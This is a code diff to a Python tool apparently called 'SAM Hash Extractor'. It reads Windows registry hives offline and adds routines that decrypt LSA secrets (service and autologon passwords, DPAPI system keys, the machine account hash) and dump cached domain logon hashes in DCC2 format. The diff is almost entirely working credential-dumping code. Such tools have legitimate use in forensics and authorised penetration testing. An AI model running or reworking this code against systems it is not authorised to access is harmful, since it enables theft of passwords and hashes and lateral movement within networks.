@@ -6,7 +6,7 @@ import hashlib
 import os
 
 from Cryptodome.Cipher import DES, AES, ARC4
-from Cryptodome.Hash import MD5
+from Cryptodome.Hash import MD5, MD4
 
 
 class RegHive:
@@ -124,12 +124,12 @@ class RegHive:
 
         if name_len > 0:
             name_bytes = cell[0x14 : 0x14 + name_len]
-            if flags & 1:
+            if flags & 1:  # COMP_NAME
                 name = name_bytes.decode('ascii', errors='replace')
             else:
                 name = name_bytes.decode('utf-16-le', errors='replace')
         else:
-            name = "(Default)"
+            name = ''
 
         real_len = data_len & 0x7FFFFFFF
         if data_len & 0x80000000:
@@ -366,14 +366,179 @@ def extract_sam_hashes(sam_hive, boot_key):
     return results
 
 
+def current_control_set(system_hive):
+    select_nk = system_hive.open_key('Select')
+    if select_nk:
+        current = system_hive.get_value(select_nk, 'Current')
+        if current:
+            return 'ControlSet%03d' % struct.unpack('<I', current)[0]
+    return 'ControlSet001'
+
+
+def get_path_default(hive, path):
+    nk = hive.open_key(path)
+    if not nk:
+        return None
+    return hive.get_value(nk, '')
+
+
+def sha256_iterated(key, value, rounds=1000):
+    h = hashlib.sha256()
+    h.update(key)
+    for _ in range(rounds):
+        h.update(value)
+    return h.digest()
+
+
+def aes_zeroiv_decrypt(key, data):
+    out = b''
+    for i in range(0, len(data), 16):
+        block = data[i:i + 16]
+        if len(block) < 16:
+            block += b'\x00' * (16 - len(block))
+        out += AES.new(key, AES.MODE_ECB).decrypt(block)
+    return out
+
+
+def unwrap_lsa_secret(key_material, value):
+    enc = value[28:]
+    if len(enc) < 64 or (len(enc) - 32) % 16 != 0:
+        return None
+    tmp = sha256_iterated(key_material, enc[:32])
+    plain = aes_zeroiv_decrypt(tmp, enc[32:])
+    length = struct.unpack_from('<I', plain, 0)[0]
+    if length > len(plain):
+        return None
+    return plain[16 : 16 + length]
+
+
+def pad4(d):
+    return d + (d & 3) if (d & 3) > 0 else d
+
+
+def service_user(system_hive, ccs, svc_name):
+    nk = system_hive.open_key(ccs + '\\Services\\' + svc_name)
+    if not nk:
+        return '(Unknown User)'
+    v = system_hive.get_value(nk, 'ObjectName')
+    if v is None:
+        return '(Unknown User)'
+    return v.decode('utf-16-le', errors='replace').rstrip('\x00') or '(Unknown User)'
+
+
+def format_secret(name, secret, system_hive, ccs):
+    upper = name.upper()
+    if upper.startswith('_SC_'):
+        body = service_user(system_hive, ccs, name[4:]) + ':' + \
+            secret.decode('utf-16-le', errors='replace')
+    elif upper.startswith('DEFAULTPASSWORD'):
+        body = '(Unknown User):' + secret.decode('utf-16-le', errors='replace')
+    elif upper.startswith('ASPNET_WP_PASSWORD'):
+        body = 'ASPNET: ' + secret.decode('utf-16-le', errors='replace')
+    elif upper.startswith('DPAPI_SYSTEM'):
+        if len(secret) >= 44:
+            body = 'dpapi_machinekey:0x' + secret[4:24].hex() + \
+                '\ndpapi_userkey:0x' + secret[24:44].hex()
+        else:
+            body = secret.hex()
+    elif upper.startswith('$MACHINE.ACC'):
+        md4 = MD4.new()
+        md4.update(secret)
+        body = '$MACHINE.ACC: ' + EMPTY_LM + ':' + md4.hexdigest()
+    else:
+        return name + ':' + secret.hex()
+    return name + ':' + body
+
+
+def dump_lsa_secrets(security, system_hive, boot_key):
+    ek = get_path_default(security, 'Policy\\PolEKList')
+    if ek is None:
+        raise ValueError("PolEKList not found in SECURITY hive")
+    lsa_key = unwrap_lsa_secret(boot_key, ek)[52:84]
+
+    pol = security.open_key('Policy\\Secrets')
+    if not pol:
+        raise ValueError("Policy\\Secrets not found")
+
+    ccs = current_control_set(system_hive) if system_hive else None
+    out = []
+    for sub in security.get_subkeys(pol):
+        name = sub['name']
+        if name.upper() == 'NL$CONTROL':
+            continue
+        val = get_path_default(security, 'Policy\\Secrets\\' + name + '\\CurrVal')
+        if val is None:
+            continue
+        secret = unwrap_lsa_secret(lsa_key, val)
+        if not secret:
+            continue
+        out.append(format_secret(name, secret, system_hive, ccs))
+    return out
+
+
+def dump_cached_hashes(security, boot_key):
+    ek = get_path_default(security, 'Policy\\PolEKList')
+    if ek is None:
+        return []
+    lsa_key = unwrap_lsa_secret(boot_key, ek)[52:84]
+
+    nlm_val = get_path_default(security, 'Policy\\Secrets\\NL$KM\\CurrVal')
+    if nlm_val is None:
+        return []
+    nklm = unwrap_lsa_secret(lsa_key, nlm_val)
+    if not nklm or len(nklm) < 32:
+        return []
+
+    cache = security.open_key('Cache')
+    if not cache:
+        return []
+
+    iteration = 10240
+    it = security.get_value(cache, 'NL$IterationCount')
+    if it is not None and len(it) >= 4:
+        rec = struct.unpack_from('<I', it, 0)[0]
+        iteration = (rec & 0xFFFFFC00) if rec > 10240 else rec * 1024
+
+    out = []
+    for vk in security._enum_values(cache):
+        name = vk['name'].upper()
+        if name in ('NL$CONTROL', 'NL$ITERATIONCOUNT'):
+            continue
+        if not name.startswith('NL$'):
+            continue
+        rec = vk['data']
+        if len(rec) < 112:
+            continue
+        iv = rec[64:80]
+        flags = struct.unpack_from('<I', rec, 48)[0]
+        if iv == b'\x00' * 16 or not (flags & 1):
+            continue
+        enc = rec[96:]
+        if len(enc) == 0 or len(enc) % 16 != 0:
+            continue
+        plain = AES.new(nklm[16:32], AES.MODE_CBC, iv).decrypt(enc)
+        enc_hash = plain[:16]
+        rest = plain[0x48:]
+        user_len = struct.unpack_from('<H', rec, 0)[0]
+        dom_len = struct.unpack_from('<H', rec, 2)[0]
+        dns_len = struct.unpack_from('<H', rec, 60)[0]
+        user = rest[:user_len].decode('utf-16-le', errors='replace')
+        rest = rest[pad4(user_len) + pad4(dom_len):]
+        domain = rest[:pad4(dns_len)].decode('utf-16-le', errors='replace')
+        out.append('%s/%s:$DCC2$%d#%s#%s' % (
+            domain, user, iteration, user, enc_hash.hex()))
+    return out
+
+
 def main():
     if len(sys.argv) < 3:
         print("SAM Hash Extractor")
-        print(f"Usage: python {sys.argv[0]} <sam.hiv> <system.hiv>")
+        print(f"Usage: python {sys.argv[0]} <sam.hiv> <system.hiv> [security.hiv]")
         sys.exit(1)
 
     sam_path = sys.argv[1]
     system_path = sys.argv[2]
+    security_path = sys.argv[3] if len(sys.argv) > 3 else None
 
     print(f"[*] Loading SYSTEM hive: {system_path}")
     system_hive = RegHive(system_path)
@@ -392,6 +557,20 @@ def main():
     for h in hashes:
         line = f"{h['username']}:{h['rid']}:{h['lm_hash']}:{h['nt_hash']}:::"
         print(line)
+
+    if security_path:
+        print(f"[*] Loading SECURITY hive: {security_path}")
+        security_hive = RegHive(security_path)
+
+        print(f"[*] Dumping cached domain logon information (domain/username:hash)")
+        for line in dump_cached_hashes(security_hive, boot_key):
+            print(line)
+
+        print(f"[*] Dumping LSA Secrets")
+        for line in dump_lsa_secrets(security_hive, system_hive, boot_key):
+            name, _, body = line.partition(':')
+            print(f"[*] {name} ")
+            print(body)
 
 
 if __name__ == '__main__':
